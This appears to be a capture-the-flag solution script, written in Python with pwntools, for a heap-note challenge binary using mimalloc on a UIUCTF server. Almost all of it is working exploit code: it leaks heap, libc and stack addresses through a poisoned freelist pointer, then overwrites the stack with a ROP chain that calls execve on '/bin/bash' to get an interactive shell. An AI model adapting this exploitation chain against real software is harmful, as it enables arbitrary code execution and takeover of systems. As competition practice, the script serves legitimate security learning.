#!/usr/bin/env python
import pwn

if pwn.args.REMOTE:
    io = pwn.remote('doremi.chal.uiuc.tf', 1337, ssl=True)
elif pwn.args.GDB:
    pwn.context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    io = pwn.gdb.debug('./chal', env={
        'LD_LIBRARY_PATH': '.',
        'LD_PRELOAD': './libmimalloc.so.2.2'
    })
else:
    io = pwn.process('./chal', env={
        'LD_LIBRARY_PATH': '.',
        'LD_PRELOAD': './libmimalloc.so.2.2'
    })


def malloc(pos):
    io.sendlineafter(b'YAHNC> ', b'1')
    io.sendlineafter(b'Position? (0-15): ', str(pos).encode())


def free(pos):
    io.sendlineafter(b'YAHNC> ', b'2')
    io.sendlineafter(b'Position? (0-15): ', str(pos).encode())


def edit(idx, content):
    io.sendlineafter(b'YAHNC> ', b'4')
    io.sendlineafter(b'Position? (0-15): ', str(idx).encode())
    io.sendafter(b'Content? (127 max): ', content)


def look(idx):
    io.sendlineafter(b'YAHNC> ', b'3')
    io.sendlineafter(b'Position? (0-15): ', str(idx).encode())
    content = io.recv(127)
    return content


elf = pwn.ELF('./chal')
malloc(0)
heap = pwn.u64(look(0)[:8]) - 0x10100
edit(0, bytes(40) + b'/bin/bash\x00')
SHELL_STR = heap + 0x10080 + 40
print(f'Heap leak: {hex(heap)}')

fake_chunk = heap + 0x190
malloc(1)
free(1)
edit(1, pwn.p64(fake_chunk))
for _ in range(32):
    malloc(2)
print(pwn.hexdump(look(2)))

# Libc leak
edit(2, pwn.p64(heap + 0x118))
malloc(3)
leak2 = pwn.u64(look(3)[:8])
print(f'Leak 2: {hex(leak2)}')
libc_address = leak2 - 0xa4b28
print(f'Libc base: {hex(libc_address)}')

# Stack leak
edit(2, pwn.p64(libc_address + 0xa2888))
malloc(4)
print(pwn.hexdump(look(4)))
data = look(4)
stack_leak = pwn.u64(data[:8])
print(f'Stack: {hex(stack_leak)}')

print(f'Leaking Stack at: {hex(stack_leak - 0x90)}')
edit(2, pwn.p64(stack_leak - 0x90))
malloc(4)
print(pwn.hexdump(look(4)))

POP_RDI = libc_address + 0x14413
RET = POP_RDI + 1
POP_RBX = libc_address + 0x3d20d
SET_REGS_SYSCALL = libc_address + 0x5f1b7
EXECVE_SYSCALL = 59

rop_chain = pwn.p64(RET)*10 + pwn.p64(POP_RDI) + \
    pwn.p64(SHELL_STR) + pwn.p64(POP_RBX) + \
    pwn.p64(EXECVE_SYSCALL) + pwn.p64(SET_REGS_SYSCALL)
assert len(rop_chain) <= 127

edit(4, rop_chain)
io.interactive()
